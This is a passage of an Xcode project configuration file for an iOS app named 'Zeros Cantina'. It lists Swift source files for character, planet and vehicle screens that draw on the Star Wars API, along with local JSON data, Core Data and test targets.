// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = FC7A74D72DFD075B000F07D3 /* SnapKit */; };
		FC842E212E1604E40013CD29 /* characters.json in Resources */ = {isa = PBXBuildFile; fileRef = FC842DC12E1604E40013CD29 /* characters.json */; };
		FC842E222E1604E40013CD29 /* planets.json in Resources */ = {isa = PBXBuildFile; fileRef = FC842DC22E1604E40013CD29 /* planets.json */; };
		FC842E232E1604E40013CD29 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = FC842DC42E1604E40013CD29 /* Assets.xcassets */; };
		FC842E252E1604E40013CD29 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = FC842E1A2E1604E40013CD29 /* LaunchScreen.storyboard */; };
		FC842E262E1604E40013CD29 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = FC842E1C2E1604E40013CD29 /* Main.storyboard */; };
		FC842E272E1604E40013CD29 /* CardType.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842D992E1604E40013CD29 /* CardType.swift */; };
		FC842E282E1604E40013CD29 /* NotificationsConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842D9A2E1604E40013CD29 /* NotificationsConstants.swift */; };
		FC842E292E1604E40013CD29 /* DIContainerProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842D9C2E1604E40013CD29 /* DIContainerProtocol.swift */; };
		FC842E2A2E1604E40013CD29 /* MainRouterProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842D9D2E1604E40013CD29 /* MainRouterProtocol.swift */; };
		FC842E2B2E1604E40013CD29 /* ModulesFactoryProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842D9E2E1604E40013CD29 /* ModulesFactoryProtocol.swift */; };
		FC842E2C2E1604E40013CD29 /* RouterProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842D9F2E1604E40013CD29 /* RouterProtocol.swift */; };
		FC842E2D2E1604E40013CD29 /* ModulesFactoryImpl.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DA12E1604E40013CD29 /* ModulesFactoryImpl.swift */; };
		FC842E2E2E1604E40013CD29 /* DIContainer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DA42E1604E40013CD29 /* DIContainer.swift */; };
		FC842E2F2E1604E40013CD29 /* UIApplication + Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DA62E1604E40013CD29 /* UIApplication + Extensions.swift */; };
		FC842E302E1604E40013CD29 /* Array.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DA82E1604E40013CD29 /* Array.swift */; };
		FC842E312E1604E40013CD29 /* Faking.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DAA2E1604E40013CD29 /* Faking.swift */; };
		FC842E322E1604E40013CD29 /* AlertBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DAC2E1604E40013CD29 /* AlertBuilder.swift */; };
		FC842E332E1604E40013CD29 /* Item.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DAF2E1604E40013CD29 /* Item.swift */; };
		FC842E342E1604E40013CD29 /* AppMenuAction.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DB12E1604E40013CD29 /* AppMenuAction.swift */; };
		FC842E352E1604E40013CD29 /* AppReducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DB32E1604E40013CD29 /* AppReducer.swift */; };
		FC842E362E1604E40013CD29 /* CommonReducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DB42E1604E40013CD29 /* CommonReducer.swift */; };
		FC842E372E1604E40013CD29 /* ItemsReducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DB52E1604E40013CD29 /* ItemsReducer.swift */; };
		FC842E382E1604E40013CD29 /* Reducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DB62E1604E40013CD29 /* Reducer.swift */; };
		FC842E392E1604E40013CD29 /* State.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DB82E1604E40013CD29 /* State.swift */; };
		FC842E3A2E1604E40013CD29 /* Store.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DB92E1604E40013CD29 /* Store.swift */; };
		FC842E3B2E1604E40013CD29 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DBC2E1604E40013CD29 /* HomeView.swift */; };
		FC842E3C2E1604E40013CD29 /* MenuItemsListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DBD2E1604E40013CD29 /* MenuItemsListView.swift */; };
		FC842E3D2E1604E40013CD29 /* CardItemCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DC72E1604E40013CD29 /* CardItemCollectionViewCell.swift */; };
		FC842E3E2E1604E40013CD29 /* CustomTabBarButtonModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DC92E1604E40013CD29 /* CustomTabBarButtonModel.swift */; };
		FC842E3F2E1604E40013CD29 /* CustomTabBarConfiguration.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DCA2E1604E40013CD29 /* CustomTabBarConfiguration.swift */; };
		FC842E402E1604E40013CD29 /* CustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DCC2E1604E40013CD29 /* CustomTabBar.swift */; };
		FC842E412E1604E40013CD29 /* CustomTabBarButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DCD2E1604E40013CD29 /* CustomTabBarButton.swift */; };
		FC842E422E1604E40013CD29 /* VCWithCustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DCF2E1604E40013CD29 /* VCWithCustomTabBar.swift */; };
		FC842E432E1604E40013CD29 /* CoreDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DD22E1604E40013CD29 /* CoreDataManager.swift */; };
		FC842E442E1604E40013CD29 /* LocalJSONCharactersFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DD42E1604E40013CD29 /* LocalJSONCharactersFetcher.swift */; };
		FC842E452E1604E40013CD29 /* LocalJSONDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DD52E1604E40013CD29 /* LocalJSONDataManager.swift */; };
		FC842E462E1604E40013CD29 /* LocalJSONPlanetsFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DD62E1604E40013CD29 /* LocalJSONPlanetsFetcher.swift */; };
		FC842E472E1604E40013CD29 /* SWAPICharactersContainerModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DD82E1604E40013CD29 /* SWAPICharactersContainerModel.swift */; };
		FC842E482E1604E40013CD29 /* SWAPIPlanetsContainerModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DD92E1604E40013CD29 /* SWAPIPlanetsContainerModel.swift */; };
		FC842E492E1604E40013CD29 /* SWAPIVehiclesContainerModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DDA2E1604E40013CD29 /* SWAPIVehiclesContainerModel.swift */; };
		FC842E4A2E1604E40013CD29 /* NetworkSWAPIDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DDC2E1604E40013CD29 /* NetworkSWAPIDataManager.swift */; };
		FC842E4B2E1604E40013CD29 /* SWAPICharactersFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DDD2E1604E40013CD29 /* SWAPICharactersFetcher.swift */; };
		FC842E4C2E1604E40013CD29 /* SWAPIPlanetsFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DDE2E1604E40013CD29 /* SWAPIPlanetsFetcher.swift */; };
		FC842E4D2E1604E40013CD29 /* SWAPIVehiclesFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DDF2E1604E40013CD29 /* SWAPIVehiclesFetcher.swift */; };
		FC842E4E2E1604E40013CD29 /* DataRepositoryWorkerProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DE42E1604E40013CD29 /* DataRepositoryWorkerProtocol.swift */; };
		FC842E4F2E1604E40013CD29 /* MainDataRepositoryProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DE52E1604E40013CD29 /* MainDataRepositoryProtocol.swift */; };
		FC842E502E1604E40013CD29 /* MainDataRepositoryImpl.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DE72E1604E40013CD29 /* MainDataRepositoryImpl.swift */; };
		FC842E512E1604E40013CD29 /* MainModuleProxyImpl.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DE92E1604E40013CD29 /* MainModuleProxyImpl.swift */; };
		FC842E522E1604E40013CD29 /* CardItemProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DED2E1604E40013CD29 /* CardItemProtocol.swift */; };
		FC842E532E1604E40013CD29 /* CharacterCardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DEF2E1604E40013CD29 /* CharacterCardModel.swift */; };
		FC842E542E1604E40013CD29 /* PlanetCardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF02E1604E40013CD29 /* PlanetCardModel.swift */; };
		FC842E552E1604E40013CD29 /* VehiclesCardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF12E1604E40013CD29 /* VehiclesCardModel.swift */; };
		FC842E562E1604E40013CD29 /* MainModuleDataOutputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF32E1604E40013CD29 /* MainModuleDataOutputProtocol.swift */; };
		FC842E572E1604E40013CD29 /* MainContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF52E1604E40013CD29 /* MainContract.swift */; };
		FC842E582E1604E40013CD29 /* MainEntity.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF62E1604E40013CD29 /* MainEntity.swift */; };
		FC842E592E1604E40013CD29 /* MainInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF72E1604E40013CD29 /* MainInteractor.swift */; };
		FC842E5A2E1604E40013CD29 /* MainPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF82E1604E40013CD29 /* MainPresenter.swift */; };
		FC842E5B2E1604E40013CD29 /* MainRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DF92E1604E40013CD29 /* MainRouter.swift */; };
		FC842E5C2E1604E40013CD29 /* CharactersModuleDataInputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DFB2E1604E40013CD29 /* CharactersModuleDataInputProtocol.swift */; };
		FC842E5D2E1604E40013CD29 /* CharactersScreenContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DFE2E1604E40013CD29 /* CharactersScreenContract.swift */; };
		FC842E5E2E1604E40013CD29 /* CharactersScreenInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842DFF2E1604E40013CD29 /* CharactersScreenInteractor.swift */; };
		FC842E5F2E1604E40013CD29 /* CharactersScreenPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E002E1604E40013CD29 /* CharactersScreenPresenter.swift */; };
		FC842E602E1604E40013CD29 /* CharactersScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E012E1604E40013CD29 /* CharactersScreenRouter.swift */; };
		FC842E612E1604E40013CD29 /* CharactersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E022E1604E40013CD29 /* CharactersScreenViewController.swift */; };
		FC842E622E1604E40013CD29 /* PlanetsModuleDataInputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E042E1604E40013CD29 /* PlanetsModuleDataInputProtocol.swift */; };
		FC842E632E1604E40013CD29 /* PlanetsScreenContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E072E1604E40013CD29 /* PlanetsScreenContract.swift */; };
		FC842E642E1604E40013CD29 /* PlanetsScreenInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E082E1604E40013CD29 /* PlanetsScreenInteractor.swift */; };
		FC842E652E1604E40013CD29 /* PlanetsScreenPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E092E1604E40013CD29 /* PlanetsScreenPresenter.swift */; };
		FC842E662E1604E40013CD29 /* PlanetsScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E0A2E1604E40013CD29 /* PlanetsScreenRouter.swift */; };
		FC842E672E1604E40013CD29 /* PlanetsScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E0B2E1604E40013CD29 /* PlanetsScreenViewController.swift */; };
		FC842E682E1604E40013CD29 /* VehiclesModuleDataInputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E0D2E1604E40013CD29 /* VehiclesModuleDataInputProtocol.swift */; };
		FC842E692E1604E40013CD29 /* VehiclesScreenContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E102E1604E40013CD29 /* VehiclesScreenContract.swift */; };
		FC842E6A2E1604E40013CD29 /* VehiclesScreenInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E112E1604E40013CD29 /* VehiclesScreenInteractor.swift */; };
		FC842E6B2E1604E40013CD29 /* VehiclesScreenPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E122E1604E40013CD29 /* VehiclesScreenPresenter.swift */; };
		FC842E6C2E1604E40013CD29 /* VehiclesScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E132E1604E40013CD29 /* VehiclesScreenRouter.swift */; };
		FC842E6D2E1604E40013CD29 /* VehiclesScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E142E1604E40013CD29 /* VehiclesScreenViewController.swift */; };
		FC842E6E2E1604E40013CD29 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E182E1604E40013CD29 /* AppDelegate.swift */; };
		FC842E6F2E1604E40013CD29 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E1D2E1604E40013CD29 /* SceneDelegate.swift */; };
		FC842E702E1604E40013CD29 /* Zeros_Cantina.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = FC842E1E2E1604E40013CD29 /* Zeros_Cantina.xcdatamodeld */; };
		FC842E732E1604EE0013CD29 /* Zeros_CantinaTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E712E1604EE0013CD29 /* Zeros_CantinaTests.swift */; };
		FC842E772E1604F10013CD29 /* Zeros_CantinaUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E742E1604F10013CD29 /* Zeros_CantinaUITests.swift */; };
		FC842E782E1604F10013CD29 /* Zeros_CantinaUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC842E752E1604F10013CD29 /* Zeros_CantinaUITestsLaunchTests.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		FC2134872DFCE8EF000B71D6 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = FC2134652DFCE8ED000B71D6 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = FC21346C2DFCE8ED000B71D6;
			remoteInfo = "Zeros Cantina";
		};
		FC2134912DFCE8EF000B71D6 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = FC2134652DFCE8ED000B71D6 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = FC21346C2DFCE8ED000B71D6;
			remoteInfo = "Zeros Cantina";
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Zeros Cantina.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		FC842D992E1604E40013CD29 /* CardType.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardType.swift; sourceTree = "<group>"; };
		FC842D9A2E1604E40013CD29 /* NotificationsConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsConstants.swift; sourceTree = "<group>"; };
		FC842D9C2E1604E40013CD29 /* DIContainerProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DIContainerProtocol.swift; sourceTree = "<group>"; };
		FC842D9D2E1604E40013CD29 /* MainRouterProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainRouterProtocol.swift; sourceTree = "<group>"; };
		FC842D9E2E1604E40013CD29 /* ModulesFactoryProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ModulesFactoryProtocol.swift; sourceTree = "<group>"; };
		FC842D9F2E1604E40013CD29 /* RouterProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RouterProtocol.swift; sourceTree = "<group>"; };
		FC842DA12E1604E40013CD29 /* ModulesFactoryImpl.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ModulesFactoryImpl.swift; sourceTree = "<group>"; };
		FC842DA42E1604E40013CD29 /* DIContainer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DIContainer.swift; sourceTree = "<group>"; };
		FC842DA62E1604E40013CD29 /* UIApplication + Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIApplication + Extensions.swift"; sourceTree = "<group>"; };
		FC842DA82E1604E40013CD29 /* Array.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Array.swift; sourceTree = "<group>"; };
		FC842DAA2E1604E40013CD29 /* Faking.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Faking.swift; sourceTree = "<group>"; };
		FC842DAC2E1604E40013CD29 /* AlertBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertBuilder.swift; sourceTree = "<group>"; };
		FC842DAF2E1604E40013CD29 /* Item.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Item.swift; sourceTree = "<group>"; };
		FC842DB12E1604E40013CD29 /* AppMenuAction.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppMenuAction.swift; sourceTree = "<group>"; };
		FC842DB32E1604E40013CD29 /* AppReducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppReducer.swift; sourceTree = "<group>"; };
		FC842DB42E1604E40013CD29 /* CommonReducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommonReducer.swift; sourceTree = "<group>"; };
		FC842DB52E1604E40013CD29 /* ItemsReducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ItemsReducer.swift; sourceTree = "<group>"; };
		FC842DB62E1604E40013CD29 /* Reducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Reducer.swift; sourceTree = "<group>"; };
		FC842DB82E1604E40013CD29 /* State.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = State.swift; sourceTree = "<group>"; };
		FC842DB92E1604E40013CD29 /* Store.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Store.swift; sourceTree = "<group>"; };
		FC842DBC2E1604E40013CD29 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
		FC842DBD2E1604E40013CD29 /* MenuItemsListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MenuItemsListView.swift; sourceTree = "<group>"; };
		FC842DC12E1604E40013CD29 /* characters.json */ = {isa = PBXFileReference; explicitFileType = text.json; path = characters.json; sourceTree = "<group>"; };
		FC842DC22E1604E40013CD29 /* planets.json */ = {isa = PBXFileReference; explicitFileType = text.json; path = planets.json; sourceTree = "<group>"; };
		FC842DC42E1604E40013CD29 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		FC842DC52E1604E40013CD29 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		FC842DC72E1604E40013CD29 /* CardItemCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardItemCollectionViewCell.swift; sourceTree = "<group>"; };
		FC842DC92E1604E40013CD29 /* CustomTabBarButtonModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBarButtonModel.swift; sourceTree = "<group>"; };
		FC842DCA2E1604E40013CD29 /* CustomTabBarConfiguration.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBarConfiguration.swift; sourceTree = "<group>"; };
		FC842DCC2E1604E40013CD29 /* CustomTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBar.swift; sourceTree = "<group>"; };
		FC842DCD2E1604E40013CD29 /* CustomTabBarButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBarButton.swift; sourceTree = "<group>"; };
		FC842DCF2E1604E40013CD29 /* VCWithCustomTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VCWithCustomTabBar.swift; sourceTree = "<group>"; };
		FC842DD22E1604E40013CD29 /* CoreDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CoreDataManager.swift; sourceTree = "<group>"; };
		FC842DD42E1604E40013CD29 /* LocalJSONCharactersFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalJSONCharactersFetcher.swift; sourceTree = "<group>"; };
		FC842DD52E1604E40013CD29 /* LocalJSONDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalJSONDataManager.swift; sourceTree = "<group>"; };
		FC842DD62E1604E40013CD29 /* LocalJSONPlanetsFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalJSONPlanetsFetcher.swift; sourceTree = "<group>"; };
		FC842DD82E1604E40013CD29 /* SWAPICharactersContainerModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPICharactersContainerModel.swift; sourceTree = "<group>"; };
		FC842DD92E1604E40013CD29 /* SWAPIPlanetsContainerModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIPlanetsContainerModel.swift; sourceTree = "<group>"; };
		FC842DDA2E1604E40013CD29 /* SWAPIVehiclesContainerModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIVehiclesContainerModel.swift; sourceTree = "<group>"; };
		FC842DDC2E1604E40013CD29 /* NetworkSWAPIDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkSWAPIDataManager.swift; sourceTree = "<group>"; };
		FC842DDD2E1604E40013CD29 /* SWAPICharactersFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPICharactersFetcher.swift; sourceTree = "<group>"; };
		FC842DDE2E1604E40013CD29 /* SWAPIPlanetsFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIPlanetsFetcher.swift; sourceTree = "<group>"; };
		FC842DDF2E1604E40013CD29 /* SWAPIVehiclesFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIVehiclesFetcher.swift; sourceTree = "<group>"; };
		FC842DE42E1604E40013CD29 /* DataRepositoryWorkerProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataRepositoryWorkerProtocol.swift; sourceTree = "<group>"; };
		FC842DE52E1604E40013CD29 /* MainDataRepositoryProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainDataRepositoryProtocol.swift; sourceTree = "<group>"; };
		FC842DE72E1604E40013CD29 /* MainDataRepositoryImpl.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainDataRepositoryImpl.swift; sourceTree = "<group>"; };
		FC842DE92E1604E40013CD29 /* MainModuleProxyImpl.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainModuleProxyImpl.swift; sourceTree = "<group>"; };
		FC842DED2E1604E40013CD29 /* CardItemProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardItemProtocol.swift; sourceTree = "<group>"; };
		FC842DEF2E1604E40013CD29 /* CharacterCardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharacterCardModel.swift; sourceTree = "<group>"; };
		FC842DF02E1604E40013CD29 /* PlanetCardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetCardModel.swift; sourceTree = "<group>"; };
		FC842DF12E1604E40013CD29 /* VehiclesCardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesCardModel.swift; sourceTree = "<group>"; };
		FC842DF32E1604E40013CD29 /* MainModuleDataOutputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainModuleDataOutputProtocol.swift; sourceTree = "<group>"; };
		FC842DF52E1604E40013CD29 /* MainContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainContract.swift; sourceTree = "<group>"; };
		FC842DF62E1604E40013CD29 /* MainEntity.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainEntity.swift; sourceTree = "<group>"; };
		FC842DF72E1604E40013CD29 /* MainInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainInteractor.swift; sourceTree = "<group>"; };
		FC842DF82E1604E40013CD29 /* MainPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainPresenter.swift; sourceTree = "<group>"; };
		FC842DF92E1604E40013CD29 /* MainRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainRouter.swift; sourceTree = "<group>"; };
		FC842DFB2E1604E40013CD29 /* CharactersModuleDataInputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersModuleDataInputProtocol.swift; sourceTree = "<group>"; };
		FC842DFE2E1604E40013CD29 /* CharactersScreenContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenContract.swift; sourceTree = "<group>"; };
		FC842DFF2E1604E40013CD29 /* CharactersScreenInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenInteractor.swift; sourceTree = "<group>"; };
		FC842E002E1604E40013CD29 /* CharactersScreenPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenPresenter.swift; sourceTree = "<group>"; };
		FC842E012E1604E40013CD29 /* CharactersScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenRouter.swift; sourceTree = "<group>"; };
		FC842E022E1604E40013CD29 /* CharactersScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenViewController.swift; sourceTree = "<group>"; };
		FC842E042E1604E40013CD29 /* PlanetsModuleDataInputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsModuleDataInputProtocol.swift; sourceTree = "<group>"; };
		FC842E072E1604E40013CD29 /* PlanetsScreenContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenContract.swift; sourceTree = "<group>"; };
		FC842E082E1604E40013CD29 /* PlanetsScreenInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenInteractor.swift; sourceTree = "<group>"; };
		FC842E092E1604E40013CD29 /* PlanetsScreenPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenPresenter.swift; sourceTree = "<group>"; };
		FC842E0A2E1604E40013CD29 /* PlanetsScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenRouter.swift; sourceTree = "<group>"; };
		FC842E0B2E1604E40013CD29 /* PlanetsScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenViewController.swift; sourceTree = "<group>"; };
		FC842E0D2E1604E40013CD29 /* VehiclesModuleDataInputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesModuleDataInputProtocol.swift; sourceTree = "<group>"; };
		FC842E102E1604E40013CD29 /* VehiclesScreenContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenContract.swift; sourceTree = "<group>"; };
		FC842E112E1604E40013CD29 /* VehiclesScreenInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenInteractor.swift; sourceTree = "<group>"; };
